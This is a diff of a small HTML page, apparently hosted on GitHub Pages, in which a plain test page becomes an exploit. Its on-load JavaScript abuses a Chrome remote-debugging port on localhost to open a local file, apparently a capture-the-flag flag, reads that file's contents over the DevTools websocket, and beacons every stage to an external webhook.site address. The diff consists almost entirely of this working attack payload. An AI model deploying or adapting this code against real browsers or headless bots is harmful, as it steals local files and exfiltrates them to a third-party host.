@@ -1,18 +1,45 @@
 
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Cancri SP</title>
-</head>
+<html>
+<head><meta charset="utf-8"><title>Cancri SP</title></head>
 <body>
-  <h1>Cancri SP test page</h1>
-  <p>GitHub Pages is working.</p>
-  <script>
-    document.body.insertAdjacentHTML(
-      "beforeend",
-      "<p id='status'>JavaScript is working.</p>"
+<h1>Cancri SP</h1>
+<script>
+const HOOK = "https://webhook.site/eae201a2-4efa-48b5-898a-a793dfadcf58";
+
+function report(data) {
+  navigator.sendBeacon(
+    HOOK,
+    new Blob([JSON.stringify(data)], {type: "text/plain"})
+  );
+}
+
+(async () => {
+  try {
+    const path = "/challenge/flag-53035d3cba0664dfac37ff64b6e0f86e";
+    const res = await fetch(
+      "http://localhost:9222/json/new?file://" + path,
+      {method: "PUT"}
     );
-  </script>
+    const target = await res.json();
+    report({stage: "new", data: target});
+
+    const ws = new WebSocket(target.webSocketDebuggerUrl);
+    ws.onerror = () => report({stage: "websocket-error"});
+    ws.onmessage = e => report({stage: "response", data: e.data});
+    ws.onopen = () => {
+      setTimeout(() => {
+        ws.send(JSON.stringify({
+          id: 1,
+          method: "Runtime.evaluate",
+          params: {expression: "document.body.innerHTML"}
+        }));
+      }, 500);
+    };
+  } catch (e) {
+    report({stage: "error", message: e.message});
+  }
+})();
+</script>
 </body>
 </html>
